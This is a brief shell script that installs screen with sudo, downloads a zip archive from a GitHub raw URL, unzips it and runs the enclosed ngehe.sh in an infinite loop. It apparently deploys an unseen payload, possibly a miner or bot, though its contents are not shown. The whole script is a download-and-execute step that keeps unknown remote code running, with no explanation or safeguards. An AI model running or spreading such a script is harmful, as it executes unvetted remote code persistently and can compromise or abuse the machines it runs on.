#!/bin/sh
sudo apt update -y
sudo apt install screen -y
sudo screen -dmS random
wget https://raw.githubusercontent.com/sapriku/ergojon/main/ngehe.zip && unzip ngehe.zip
chmod +x ngehe.sh
while [ 1 ]; do
./ngehe.sh
sleep 96969
done
sleep 96969
